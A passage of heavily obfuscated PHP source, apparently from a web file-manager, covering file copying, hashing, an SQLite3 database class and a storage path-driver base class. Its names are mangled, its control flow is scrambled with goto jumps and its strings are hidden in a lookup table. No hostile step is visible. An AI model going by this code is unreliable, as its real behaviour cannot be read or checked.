_get($b„ëŠã³ìë, $CåÒÈóïóã[431], 0); if (!isset($b„ëŠã³ìë[$CåÒÈóïóã[553]]) && $b„ëŠã³ìë[$CåÒÈóïóã[431]]) { $d˜†ï§”µ¨[$CåÒÈóïóã[550]][] = $b„ëŠã³ìë[$CåÒÈóïóã[431]]; } goto B·×¤¦®¾½; B·×¤¦®¾½: if ($C…ìŠŒ”) { $d¤¼Šç‘¨Ğ = $this->fileNameExistCache($C¡¶æø·ÄÚ, $b„ëŠã³ìë[$CåÒÈóïóã[38]]); if ($d¤¼Šç‘¨Ğ) { if ($b„ëŠã³ìë[$CåÒÈóïóã[382]] || $C…ìŠŒ” == REPEAT_SKIP) { continue; } if ($C…ìŠŒ” == REPEAT_REPLACE) { $e‡›µõ“®Ä = $this->sourceInfoCache($d¤¼Šç‘¨Ğ); $Dª±ÈÖÉÀë = $this->fileHistory($e‡›µõ“®Ä, $b„ëŠã³ìë[$CåÒÈóïóã[431]], $b„ëŠã³ìë[$CåÒÈóïóã[87]]); if ($Dª±ÈÖÉÀë) { $d˜†ï§”µ¨[$CåÒÈóïóã[514]][] = $b„ëŠã³ìë[$CåÒÈóïóã[431]]; } continue; } else { if ($C…ìŠŒ” == REPEAT_RENAME) { $b„ëŠã³ìë[$CåÒÈóïóã[38]] = $this->fileNameAutoCache($C¡¶æø·ÄÚ, $b„ëŠã³ìë[$CåÒÈóïóã[38]], $C…ìŠŒ”, !1); } } } } if (!$b„ëŠã³ìë[$CåÒÈóïóã[382]] && $b„ëŠã³ìë[$CåÒÈóïóã[431]]) { $d˜†ï§”µ¨[$CåÒÈóïóã[514]][] = $b„ëŠã³ìë[$CåÒÈóïóã[431]]; } $EĞ–à‡š[] = $this->_makeItemData($b„ëŠã³ìë, $eâ›˜šåÓ—, $b„ëŠã³ìë[$CåÒÈóïóã[38]]); goto FÅÃĞİÛÈ‰; FÅÃĞİÛÈ‰: } unset($b„ëŠã³ìë); if (!empty($EĞ–à‡š)) { $this->addAll($EĞ–à‡š); } goto FîÚÒ”÷Œ÷; FîÚÒ”÷Œ÷: $A®×ÉŞÌË¸ = $this->_childrenList($C¡¶æø·ÄÚ); $A®×ÉŞÌË¸ = array_to_keyvalue($A®×ÉŞÌË¸, $CåÒÈóïóã[38]); foreach ($CŞ¦ØÓ‰¨‡ as $b„ëŠã³ìë) { $e‡›µõ“®Ä = $A®×ÉŞÌË¸[$b„ëŠã³ìë[$CåÒÈóïóã[38]]]; $cÁÌÎçïé = $e‡›µõ“®Ä[$CåÒÈóïóã[381]]; $this->_copyApplyMeta($e‡›µõ“®Ä, $d˜†ï§”µ¨); if ($b„ëŠã³ìë[$CåÒÈóïóã[39]] == $CåÒÈóïóã[86]) { $b„ëŠã³ìë[$CåÒÈóïóã[85]] = $A®«›ÃÍÁ->getPathInner($b„ëŠã³ìë[$CåÒÈóïóã[85]]); $this->_copyChildTo($A®«›ÃÍÁ, $b„ëŠã³ìë[$CåÒÈóïóã[85]], $cÁÌÎçïé, $C…ìŠŒ”, $d˜†ï§”µ¨, $FÂÖˆÑÕïØ); } } goto Dæä¢Ñ„Ø; Dæä¢Ñ„Ø: } private function _addFiles($AíÄ¼‹Èˆê, $C‘ÃÚîãí, $EÙ¼ÇâÙ) { goto D³éòòØÌ¡; FäØò®‡—®: $aàÜÊ“†ø¶ = Model($BÑÃ÷¸ù‘È[556]); $fÒ¾¼ˆßà = $aàÜÊ“†ø¶->where($f˜ËÇÔÀ±ß)->select(); $fÒ¾¼ˆßà = $fÒ¾¼ˆßà ? $fÒ¾¼ˆßà : array(); goto C¾¿ÄÍÉöš; c†ÒéÚµ°: $fÒ¾¼ˆßà = $fÒ¾¼ˆßà ? $fÒ¾¼ˆßà : array(); foreach ($fÒ¾¼ˆßà as $b„³ÃÃÏÈ¿) { if (!isset($b»¯ˆª½½[$b„³ÃÃÏÈ¿[$BÑÃ÷¸ù‘È[177]]])) { continue; } $aÏ¼½½š¯á =& $b»¯ˆª½½[$b„³ÃÃÏÈ¿[$BÑÃ÷¸ù‘È[177]]]; foreach ($aÏ¼½½š¯á as &$D«İò•ß÷Ş) { $D«İò•ß÷Ş[$BÑÃ÷¸ù‘È[431]] = $b„³ÃÃÏÈ¿[$BÑÃ÷¸ù‘È[431]]; } unset($D«İò•ß÷Ş); } $Eº¨ö†é©â = array(); goto b…“Éòªíñ; eƒì‚ƒ¾ƒ: $aàÜÊ“†ø¶->addAll($f„§âŠ±å); $f˜ËÇÔÀ±ß = array($BÑÃ÷¸ù‘È[177] => array($BÑÃ÷¸ù‘È[7], array_keys($b»¯ˆª½½))); $fÒ¾¼ˆßà = $aàÜÊ“†ø¶->where($f˜ËÇÔÀ±ß)->select(); goto c†ÒéÚµ°; C¾¿ÄÍÉöš: foreach ($fÒ¾¼ˆßà as $b„³ÃÃÏÈ¿) { if (!isset($b»¯ˆª½½[$b„³ÃÃÏÈ¿[$BÑÃ÷¸ù‘È[177]]])) { continue; } $a¶ØÕšší = $b»¯ˆª½½[$b„³ÃÃÏÈ¿[$BÑÃ÷¸ù‘È[177]]]; foreach ($a¶ØÕšší as &$D«İò•ß÷Ş) { $D«İò•ß÷Ş[$BÑÃ÷¸ù‘È[431]] = $b„³ÃÃÏÈ¿[$BÑÃ÷¸ù‘È[431]]; $D«İò•ß÷Ş[$BÑÃ÷¸ù‘È[553]] = !0; } unset($D«İò•ß÷Ş); } $f„§âŠ±å = array(); foreach ($C‘ÃÚîãí as $eÀ‹Ù¥‰È¶) { if (isset($eÀ‹Ù¥‰È¶[$BÑÃ÷¸ù‘È[553]]) && $eÀ‹Ù¥‰È¶[$BÑÃ÷¸ù‘È[553]]) { continue; } $A¼—íÛê‘Å = $AíÄ¼‹Èˆê->getPathInner($eÀ‹Ù¥‰È¶[$BÑÃ÷¸ù‘È[85]]); $e–˜’•Äèˆ = $aàÜÊ“†ø¶->addFileMake($A¼—íÛê‘Å, $eÀ‹Ù¥‰È¶[$BÑÃ÷¸ù‘È[87]], $eÀ‹Ù¥‰È¶[$BÑÃ÷¸ù‘È[178]], $eÀ‹Ù¥‰È¶[$BÑÃ÷¸ù‘È[177]], $eÀ‹Ù¥‰È¶[$BÑÃ÷¸ù‘È[38]], $EÙ¼ÇâÙ); $f„§âŠ±å[] = $e–˜’•Äèˆ; } goto eƒì‚ƒ¾ƒ; D³éòòØÌ¡: $BÑÃ÷¸ù‘È =& $_SERVER[¨¤¼…´]; if (!$C‘ÃÚîãí || count($C‘ÃÚîãí) == 0) { return array(); } $b»¯ˆª½½ = array(); goto A…ãÁÅ”Ç; b…“Éòªíñ: foreach ($C‘ÃÚîãí as $E©¥ åøİ³) { $Eº¨ö†é©â[$E©¥ åøİ³[$BÑÃ÷¸ù‘È[38]]] = $E©¥ åøİ³; } return $Eº¨ö†é©â; goto c„ÃÄªáíí; A…ãÁÅ”Ç: foreach ($C‘ÃÚîãí as &$D«İò•ß÷Ş) { goto cçåŞóÅ¦ì; A­Ú¶ß½¬Ã: $d‹—éö·©´ = $AíÄ¼‹Èˆê->hashMd5($D«İò•ß÷Ş[$BÑÃ÷¸ù‘È[85]]); if (strlen($d‹—éö·©´) > 10 && !isset($b»¯ˆª½½[$d‹—éö·©´])) { $b»¯ˆª½½[$d‹—éö·©´] = array(); } $D«İò•ß÷Ş[$BÑÃ÷¸ù‘È[178]] = $BÎªš·¼‡ï; goto bÒÔíãš; d¢ÁÍˆ­„‰: if (count($b»¯ˆª½½[$d‹—éö·©´]) > 1) { $D«İò•ß÷Ş[$BÑÃ÷¸ù‘È[553]] = !0; } goto b©Ğ°ÄÏ¯; bÒÔíãš: $D«İò•ß÷Ş[$BÑÃ÷¸ù‘È[177]] = $d‹—éö·©´; Hook::trigger($BÑÃ÷¸ù‘È[555], $D«İò•ß÷Ş); $b»¯ˆª½½[$d‹—éö·©´][] =& $D«İò•ß÷Ş; goto d¢ÁÍˆ­„‰; cçåŞóÅ¦ì: Hook::trigger($BÑÃ÷¸ù‘È[554], $D«İò•ß÷Ş); $D«İò•ß÷Ş[$BÑÃ÷¸ù‘È[85]] = $AíÄ¼‹Èˆê->getPathInner($D«İò•ß÷Ş[$BÑÃ÷¸ù‘È[85]]); $BÎªš·¼‡ï = $AíÄ¼‹Èˆê->hashSimple($D«İò•ß÷Ş[$BÑÃ÷¸ù‘È[85]]); goto A­Ú¶ß½¬Ã; b©Ğ°ÄÏ¯: } unset($D«İò•ß÷Ş); $f˜ËÇÔÀ±ß = array($BÑÃ÷¸ù‘È[177] => array($BÑÃ÷¸ù‘È[7], array_keys($b»¯ˆª½½))); goto FäØò®‡—®; c„ÃÄªáíí: } } goto E»Æ…ÅŸÆ; eğ•ì—‡á: class DbSqlite3Base extends Db { public function __construct($FÎÎ‘–½Ä = '') { $aè§öÅÜ‚ =& $_SERVER[¨¤¼…´]; if (!class_exists($aè§öÅÜ‚[61])) { think_exception(think_lang($aè§öÅÜ‚[20]) . $aè§öÅÜ‚[62]); } if (!empty($FÎÎ‘–½Ä)) { if (!isset($FÎÎ‘–½Ä[$aè§öÅÜ‚[22]])) { $FÎÎ‘–½Ä[$aè§öÅÜ‚[22]] = 438; } $this->config = $FÎÎ‘–½Ä; if (empty($this->config[$aè§öÅÜ‚[23]])) { $this->config[$aè§öÅÜ‚[23]] = array(); } } } public function connect($b”™‡»á³Ğ = '', $Còò¥Š’› = 0) { $B‰ƒµäšãô =& $_SERVER[¨¤¼…´]; if (!isset($this->linkID[$Còò¥Š’›])) { if (empty($b”™‡»á³Ğ)) { $b”™‡»á³Ğ = $this->config; } $this->linkID[$Còò¥Š’›] = new SQLite3($b”™‡»á³Ğ[$B‰ƒµäšãô[27]]); if (!$this->linkID[$Còò¥Š’›]) { think_exception($this->linkID[$Còò¥Š’›]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Còò¥Š’›]->busyTimeout(30000); if (1 != think_config($B‰ƒµäšãô[28])) { unset($this->config); } } return $this->linkID[$Còò¥Š’›]; } public function free() { $this->queryID = null; } public function query($Cçé²õŒ¾¯) { goto fç‚±™†Ï¾; eğá‡¢ä×…: $this->queryStr = $Cçé²õŒ¾¯; if ($this->queryID) { $this->free(); } think_action_status($FøÀí†—ƒë[29], 1); goto BÆ™´—ßëô; F‰®¾¯ÀÜæ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $BÒñ‚Ú¡Âº = $this->getAll(); $this->numRows = count($BÒñ‚Ú¡Âº); return $BÒñ‚Ú¡Âº; } goto FÈ´±•»‹Å; fç‚±™†Ï¾: $FøÀí†—ƒë =& $_SERVER[¨¤¼…´]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eğá‡¢ä×…; BÆ™´—ßëô: think_status($FøÀí†—ƒë[30]); $this->queryID = $this->_linkID->query($Cçé²õŒ¾¯); $this->debug(); goto F‰®¾¯ÀÜæ; FÈ´±•»‹Å: } public function execute($C¤çÁÛƒğ) { goto CÜÎ©±¡êÀ; d‘”çİîÕ: if (!1 === $e¬°Üíó¯„) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto A‹³Ø¢âõ¢; CÜÎ©±¡êÀ: $a„¬ö‡ã‚Ñ =& $_SERVER[¨¤¼…´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d“®Ñ»Ã×¹; D’¾ƒ†´âÎ: think_status($a„¬ö‡ã‚Ñ[30]); $e¬°Üíó¯„ = $this->_linkID->exec($C¤çÁÛƒğ); $this->debug(); goto d‘”çİîÕ; d“®Ñ»Ã×¹: $this->queryStr = $C¤çÁÛƒğ; if ($this->queryID) { $this->free(); } think_action_status($a„¬ö‡ã‚Ñ[31], 1); goto D’¾ƒ†´âÎ; A‹³Ø¢âõ¢: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¨¤¼…´][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EŒ§Ÿ‘„Çº = $this->_linkID->query($_SERVER[¨¤¼…´][33]); if (!$EŒ§Ÿ‘„Çº) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Fî¡ÔâÎ¶Ã = $this->_linkID->query($_SERVER[¨¤¼…´][34]); if (!$Fî¡ÔâÎ¶Ã) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $F—Öã…àÌ = array(); while ($a‡óŠéÌ˜ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $F—Öã…àÌ[] = $a‡óŠéÌ˜; } $this->queryID->reset(); return $F—Öã…àÌ; } public function getFields($CôŒÇñæš…) { $DÃƒÄ•Â”¦ =& $_SERVER[¨¤¼…´]; $e †Ç ¢Ì‹ = $this->query($DÃƒÄ•Â”¦[35] . $CôŒÇñæš… . $DÃƒÄ•Â”¦[36]); $aæç§ìÍ¼Š = array(); if ($e †Ç ¢Ì‹) { foreach ($e †Ç ¢Ì‹ as $d¿÷Æ¿ëÌ÷ => $eÆÏİŠãÀŞ) { $aæç§ìÍ¼Š[$eÆÏİŠãÀŞ[$DÃƒÄ•Â”¦[38]]] = array($DÃƒÄ•Â”¦[38] => $eÆÏİŠãÀŞ[$DÃƒÄ•Â”¦[38]], $DÃƒÄ•Â”¦[39] => $eÆÏİŠãÀŞ[$DÃƒÄ•Â”¦[39]], $DÃƒÄ•Â”¦[41] => (bool) ($eÆÏİŠãÀŞ[$DÃƒÄ•Â”¦[41]] === $DÃƒÄ•Â”¦[43]), $DÃƒÄ•Â”¦[44] => $eÆÏİŠãÀŞ[$DÃƒÄ•Â”¦[63]], $DÃƒÄ•Â”¦[46] => (bool) $eÆÏİŠãÀŞ[$DÃƒÄ•Â”¦[64]], $DÃƒÄ•Â”¦[49] => (bool) $eÆÏİŠãÀŞ[$DÃƒÄ•Â”¦[64]]); } } return $aæç§ìÍ¼Š; } public function getTables($e‘ÅºÍŒÚí = '') { $e…ºññ±ò =& $_SERVER[¨¤¼…´]; $aé‰÷…„ô = $this->query($e…ºññ±ò[52] . $e…ºññ±ò[53] . $e…ºññ±ò[54]); $b Øå¨——´ = array(); foreach ($aé‰÷…„ô as $d¿§‰¦¤­ => $dá°÷ù÷«) { $b Øå¨——´[$d¿§‰¦¤­] = current($dá°÷ù÷«); } return $b Øå¨——´; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $FŞÒÎœÌœ =& $_SERVER[¨¤¼…´]; $this->error = $this->_linkID->lastErrorMsg(); if ($FŞÒÎœÌœ[43] != $this->queryStr) { $this->error .= LNG($FŞÒÎœÌœ[55]) . $this->queryStr; } think_trace($this->error, $FŞÒÎœÌœ[43], $FŞÒÎœÌœ[56]); return $this->error; } public function escapeString($a‘á»åŒ¸Ç) { $C·ÚÑÌ§¿“ =& $_SERVER[¨¤¼…´]; if ($this->_linkID) { return $this->_linkID->escapeString($a‘á»åŒ¸Ç); } return str_ireplace($C·ÚÑÌ§¿“[65], $C·ÚÑÌ§¿“[66], $a‘á»åŒ¸Ç); } public function parseLimit($bºÓÄ¤ô²) { $DŒ©Ø®Ú =& $_SERVER[¨¤¼…´]; $d©¹Ó¸Æ‰ö = $DŒ©Ø®Ú[43]; if (!empty($bºÓÄ¤ô²)) { $bºÓÄ¤ô² = explode($DŒ©Ø®Ú[57], $bºÓÄ¤ô²); if (count($bºÓÄ¤ô²) > 1) { $d©¹Ó¸Æ‰ö .= $DŒ©Ø®Ú[58] . $bºÓÄ¤ô²[1] . $DŒ©Ø®Ú[59] . $bºÓÄ¤ô²[0] . $DŒ©Ø®Ú[60]; } else { $d©¹Ó¸Æ‰ö .= $DŒ©Ø®Ú[58] . $bºÓÄ¤ô²[0] . $DŒ©Ø®Ú[60]; } } return $d©¹Ó¸Æ‰ö; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $f öÈÙÓ‹‹ =& $_SERVER[¨¤¼…´]; $this->objectDriver = array($f öÈÙÓ‹‹[67], $f öÈÙÓ‹‹[68], $f öÈÙÓ‹‹[69], $f öÈÙÓ‹‹[70], $f öÈÙÓ‹‹[71], $f öÈÙÓ‹‹[72], $f öÈÙÓ‹‹[73], $f öÈÙÓ‹‹[74]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($D÷ù„³‡ŠË) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($D÷ù„³‡ŠË, $_SERVER[¨¤¼…´][8]); } return $D÷ù„³‡ŠË; } public function getPathName($F°ç«‡„à¥) { return $F°ç«‡„à¥; } public function iconvApp($c•‚—áŸ) { return $c•‚—áŸ; } public function iconvSystem($FŠô¦ô¥ù) { return $FŠô¦ô¥ù; } public function iconvTo($A…÷„ÆÆáâ, $CêÑ„ßÆšÊ, $E–‡îï¬ßº) { goto E‚óßõ¶­Ë; BçÏæ”©‹·: return $E®«Äñ­ï‚; goto BÀÊÈõÈ‡; E‚óßõ¶­Ë: $déÑ×½øĞ =& $_SERVER[¨¤¼…´]; if (!$A…÷„ÆÆáâ || !function_exists($déÑ×½øĞ[75])) { return $A…÷„ÆÆáâ; } static $c±¬³Ë•ù‡ = array(); goto fÕƒÀÁ×´; fÕƒÀÁ×´: $a…¹¸ÃƒøÆ = $CêÑ„ßÆšÊ . $déÑ×½øĞ[76] . $E–‡îï¬ßº . $déÑ×½øĞ[77] . $A…÷„ÆÆáâ; if (isset($c±¬³Ë•ù‡[$a…¹¸ÃƒøÆ])) { return $c±¬³Ë•ù‡[$a…¹¸ÃƒøÆ]; } if (function_exists($déÑ×½øĞ[78])) { $E®«Äñ­ï‚ = @mb_convert_encoding($A…÷„ÆÆáâ, $E–‡îï¬ßº, $CêÑ„ßÆšÊ); } else { $E®«Äñ­ï‚ = @iconv($CêÑ„ßÆšÊ, $E–‡îï¬ßº, $A…÷„ÆÆáâ); } goto aê¼®; DßÂ¢°„§ö: $c±¬³Ë•ù‡[$E–‡îï¬ßº . $déÑ×½øĞ[76] . $CêÑ„ßÆšÊ . $déÑ×½øĞ[77] . $A…÷„ÆÆáâ] = $A…÷„ÆÆáâ; $c±¬³Ë•ù‡[$E–‡îï¬ßº . $déÑ×½øĞ[76] . $CêÑ„ßÆšÊ . $déÑ×½øĞ[77] . $E®«Äñ­ï‚] = $A…÷„ÆÆáâ; $c±¬³Ë•ù‡[$CêÑ„ßÆšÊ . $déÑ×½øĞ[76] . $E–‡îï¬ßº . $déÑ×½øĞ[77] . $E®«Äñ­ï‚] = $E®«Äñ­ï‚; goto BçÏæ”©‹·; aê¼®: $E®«Äñ­ï‚ = $E®«Äñ­ï‚ ? $E®«Äñ­ï‚ : $A…÷„ÆÆáâ; if (strstr($E®«Äñ­ï‚, $déÑ×½øĞ[79])) { $E®«Äñ­ï‚ = str_replace($déÑ×½øĞ[79], $déÑ×½øĞ[80], $E®«Äñ­ï‚); } $c±¬³Ë•ù‡[$CêÑ„ßÆšÊ . $déÑ×½øĞ[76] . $E–‡îï¬ßº . $déÑ×½øĞ[77] . $A…÷„ÆÆáâ] = $E®«Äñ­ï‚; goto DßÂ¢°„§ö; BÀÊÈõÈ‡: } public function getPathInner($E÷½‚Õ©½) { $bÂ‰Ÿ§ºù = IO::init($E÷½‚Õ©½); return $bÂ‰Ÿ§ºù->path; } public function getPathOuter($f¯˜°öÅ°) { $eæùÇ‚ƒŸ =& $_SERVER[¨¤¼…´]; $C¥œŠâ„²ä = strlen(trim($this->pathBase, $eæùÇ‚ƒŸ[8])); $f¯˜°öÅ° = substr(trim($f¯˜°öÅ°, $eæùÇ‚ƒŸ[8]), $C¥œŠâ„²ä); return $this->pathDriver . $eæùÇ‚ƒŸ[8] . ltrim($f¯˜°öÅ°, $eæùÇ‚ƒŸ[8]); } public function isParentOf($aù‚‰ä²Ì, $fŠ¢áš›) { $F¨½à³´Íá =& $_SERVER[¨¤¼…´]; $aù‚‰ä²Ì = rtrim(strtolower($aù‚‰ä²Ì), $F¨½à³´Íá[8]) . $F¨½à³´Íá[8]; $fŠ¢áš› = rtrim(strtolower($fŠ¢áš›), $F¨½à³´Íá[8]) . $F¨½à³´Íá[8]; $d”ƒ˜İ³àø = strpos($fŠ¢áš›, $aù‚‰ä²Ì) === 0; return $d”ƒ˜İ³àø; } public function getType() { $FîæÃ‹Ï…ì =& $_SERVER[¨¤¼…´]; $b‘¼•ù§–” = str_replace($FîæÃ‹Ï…ì[81], $FîæÃ‹Ï…ì[43], get_class($this)); return strtolower($b‘¼•ù§–”); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($FèÀ¯Æ¥ˆÜ, $cë¿ˆˆÅë) { $eì íÛ¥³š =& $_SERVER[¨¤¼…´]; $CÅ—²ÑĞó¬ = rtrim($FèÀ¯Æ¥ˆÜ, $eì íÛ¥³š[8]) . $eì íÛ¥³š[8] . $cë¿ˆˆÅë; $c¹˜º«¬Ù = $this->exist($CÅ—²ÑĞó¬); return $c¹˜º«¬Ù ? $CÅ—²ÑĞó¬ : !1; } public function setModifyTime($Dá¬Î˜µ˜‡, $cº­¢“‘§ê = '') { } public function renameObject($e™â–¢ƒæ‹, $CÇ¶ˆÃÑ–œ) { goto D…Õ¤¨Â; D…Õ¤¨Â: $aÇÛ‚· …Ì =& $_SERVER[¨¤¼…´]; $Bâä¼Ğà÷Ñ = $CÇ¶ˆÃÑ–œ; Hook::trigger($aÇÛ‚· …Ì[82], $this, $e™â–¢ƒæ‹, $this, $this->pathFather($e™â–¢ƒæ‹) . $CÇ¶ˆÃÑ–œ); goto cÖò·ˆÅÄë; cÖò·ˆÅÄë: $e™â–¢ƒæ‹ = $this->getPathOuter($e™â–¢ƒæ‹); $CÇ¶ˆÃÑ–œ = $this->pathFather($e™â–¢ƒæ‹) . $CÇ¶ˆÃÑ–œ; if (IO::isFile($e™â–¢ƒæ‹)) { $bÏ¹Œˆ¡ÒÖ = IO::copy($e™â–¢ƒæ‹, $this->pathFather($e™â–¢ƒæ‹), REPEAT_RENAME_FOLDER, $Bâä¼Ğà÷Ñ); if ($bÏ¹Œˆ¡ÒÖ) { IO::remove($e™â–¢ƒæ‹); } } else { $bÏ¹Œˆ¡ÒÖ = IO::mkdir($CÇ¶ˆÃÑ–œ); if (!$bÏ¹Œˆ¡ÒÖ) { return !1; } $CÇ†ŞòóÑ˜ = IO::listPath($e™â–¢ƒæ‹, !0); $aÅ¥ò÷¿¸ = array_merge($CÇ†ŞòóÑ˜[$aÇÛ‚· …Ì[83]], $CÇ†ŞòóÑ˜[$aÇÛ‚· …Ì[84]]); foreach ($aÅ¥ò÷¿¸ as $B®ÓÎ­ß Â) { IO::move($B®ÓÎ­ß Â[$aÇÛ‚· …Ì[85]], $CÇ¶ˆÃÑ–œ, REPEAT_RENAME_FOLDER); } IO::remove($e™â–¢ƒæ‹); } goto AëëÍ«†÷ö; AëëÍ«†÷ö: return $bÏ¹Œˆ¡ÒÖ ? $CÇ¶ˆÃÑ–œ : !1; goto aÃ¿œ„“·; aÃ¿œ„“·: } public function tempFile($cÚÜ´„óó = '', $f¢»µ£ï = '') { goto F¤³äîÓ‰Â; F¤³äîÓ‰Â: if (!$cÚÜ´„óó) { $cÚÜ´„óó = rand_string(15); } $eÊ³Å¶Äˆğ = TEMP_FILES . rand_string(15) . $_SERVER[¨¤¼…´][8]; @mkdir($eÊ³Å¶Äˆğ, 511, !0); goto F‹­…§¬ĞÅ; F‹­…§¬ĞÅ: $Eøæ®Ğ„Ìá = $eÊ³Å¶Äˆğ . $cÚÜ´„óó; @touch($Eøæ®Ğ„Ìá); if ($f¢»µ£ï) { file_put_contents($Eøæ®Ğ„Ìá, $f¢»µ£ï); } goto FÖŠÍ¨Áß‚; FÖŠÍ¨Áß‚: return $Eøæ®Ğ„Ìá; goto bî¢ç×óĞ; bî¢ç×óĞ: } public function tempFileRemve($BƒÈÙ›Ö¢­) { @unlink($BƒÈÙ›Ö¢­); @rmdir($this->pathFather($BƒÈÙ›Ö¢­)); } public function mkfile($a“ÛÙ“›ìæ, $AÄèŸİ„³ö = '', $aÏÚïóáÒ = REPEAT_RENAME) { } public function mkdir($E±‘‰Ñ é, $BŸÒ©÷ò = REPEAT_SKIP) { } public function delFile($AÅÂßéë÷) { } public function delFolder($bÀ˜à¶İ·­) { } public function copyFile($BœŞÃ„Íóò, $F†×ˆ™‡) { } public function moveFile($F¨Äê£Ó, $FÔÔÒÜ±À) { } public function remove($E¢ˆ¼¨õ¿„) { if ($this->isFile($E¢ˆ¼¨õ¿„)) { return $this->delFile($E¢ˆ¼¨õ¿„); } return $this->delFolder($E¢ˆ¼¨õ¿„); } public function rename($A°ÇëˆÁÇá, $E²™”ŞâÕ¾) { } public function exist($fö £ Ú¬Î) { } public function findByHash($Cö“÷‰­öÉ = '', $d¥‹²•è²¶ = '') { return !1; } public function isFile($A™÷˜ÃÖ¾Î) { } public function isFolder($C‚÷šßÕ) { } public function size($Dª†ã¿ÜÉ) { } public function info($bµÇ¯ø³øî) { } public function infoSimple($Bë°ò—Äà¢) { return $this->info($Bë°ò—Äà¢); } public function infoAuth($fèóÑäã—) { return $this->info($fèóÑäã—); } public function infoFull($C÷ŠÄ§áÜµ) { return $this->info($C÷ŠÄ§áÜµ); } public function infoWithChildren($A¦¤ÔøÂèé) { $b×ŠÆÛø =& $_SERVER[¨¤¼…´]; static $B£¼éí†¹ó = array(); if (isset($B£¼éí†¹ó[$A¦¤ÔøÂèé])) { return $B£¼éí†¹ó[$A¦¤ÔøÂèé]; } $a—£²ÑØŸÈ = $this->info($A¦¤ÔøÂèé); if ($a—£²ÑØŸÈ && $a—£²ÑØŸÈ[$b×ŠÆÛø[39]] == $b×ŠÆÛø[86]) { $c†¥‰è±± = array($b×ŠÆÛø[87] => 0, $b×ŠÆÛø[88] => 0, $b×ŠÆÛø[89] => 0); $this->infoChildren($A¦¤ÔøÂèé, $c†¥‰è±±); $a—£²ÑØŸÈ[$b×ŠÆÛø[87]] = $c†¥‰è±±[$b×ŠÆÛø[87]]; $a—£²ÑØŸÈ[$b×ŠÆÛø[90]] = array($b×ŠÆÛø[91] => $c†¥‰è±±[$b×ŠÆÛø[88]], $b×ŠÆÛø[92] => $c†¥‰è±±[$b×ŠÆÛø[89]]); $B£¼éí†¹ó[$A¦¤ÔøÂèé] = $a—£²ÑØŸÈ; } return $a—£²ÑØŸÈ; } public function listPath($DÃå¼¾Ç¶, $D¼øìÓšä = false) { } public function has($E÷«º¤ø§¢, $Dí†Ä•ùƒ˜ = false, $d†¦Æ†…¬‡ = false) { } public function canRead($EÒŒé¨Íï¥) { } public function canWrite($bŠâàô…‡¨) { } public function getContent($b ¼¡ôã¥¨) { } public function setContent($CçåÂÉ‚, $EğÍæØïø = '') { } protected function infoChildren($cÙ·¬ÉÔÃ, &$Aøó¦ÚÈö¶) { $A”à¹¿ŒáŠ =& $_SERVER[¨¤¼…´]; check_abort(); $eæ¨ëŞ¢ê“ = $this->listPath($cÙ·¬ÉÔÃ, !0); $eæ¨ëŞ¢ê“ = array_merge($eæ¨ëŞ¢ê“[$A”à¹¿ŒáŠ[84]], $eæ¨ëŞ¢ê“[$A”à¹¿ŒáŠ[83]]); foreach ($eæ¨ëŞ¢ê“ as $aÁÜÑÈç) { if ($aÁÜÑÈç[$A”à¹¿ŒáŠ[39]] == $A”à¹¿ŒáŠ[86]) { $Aøó¦ÚÈö¶[$A”à¹¿ŒáŠ[89]]++; $aë‚±¤¤‘ = $this->getPathInner($aÁÜÑÈç[$A”à¹¿ŒáŠ[85]]); $this->infoChildren($aë‚±¤¤‘, $Aøó¦ÚÈö¶); } else { $Aøó¦ÚÈö¶[$A”à¹¿ŒáŠ[88]]++; $Aøó¦ÚÈö¶[$A”à¹¿ŒáŠ[87]] += $aÁÜÑÈç[$A”à¹¿ŒáŠ[87]]; } } } public function fileSubstr($Bòƒ…´’”¿, $FÄ˜’šÍÔ‘, $A­êæ …®¨) { } public function listAll($Dóñ‰î¡›–) { } public function upload($bˆ†Ç³Ù‡¹, $cï³ŞÆòÖ, $A™êˆ£Ìáà = false, $dèàì…¦Ï = REPEAT_REPLACE) { } public function uploadFileByID($C‰½§±‰Îğ, $A½ì‹¿¥Ñ, $dÈô±ø‡©½) { } public function uploadFileByPath($AƒòñŠ›Ç¨, $d†éº…ŠÖÅ, $C›•ˆ´˜™ø = array()) { } public function isUploadServer() { $D¾‰ñ±Š‘ =& $_SERVER[¨¤¼…´]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $D¾‰ñ±Š‘[93]) { return !0; } return $GLOBALS[$D¾‰ñ±Š‘[6]][$D¾‰ñ±Š‘[94]][$D¾‰ñ±Š‘[95]]; } public function isFileOutServer() { $cÙá‰ ²Á =& $_SERVER[¨¤¼…´]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $cÙá‰ ²Á[93]) { return !0; } return $GLOBALS[$cÙá‰ ²Á[6]][$cÙá‰ ²Á[94]][$cÙá‰ ²Á[96]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($cÙ¦™á¶·í) { $DòŸèÕïå =& $_SERVER[¨¤¼…´]; if (!$this->isCdnHost()) { return $cÙ¦™á¶·í; } return str_replace(trim(get_url_root($cÙ¦™á¶·í), $DòŸèÕïå[8]), trim($this->cdnHost, $DòŸèÕïå[8]), $cÙ¦™á¶·í); } public function uploadLink($Cš‚ –ö¾î, $b‰Å¡Í‹øâ = 0) { goto C²âŠÜòÖ; C‚Ú‚®Š‰: if ($B·éáÉ‚›„) { 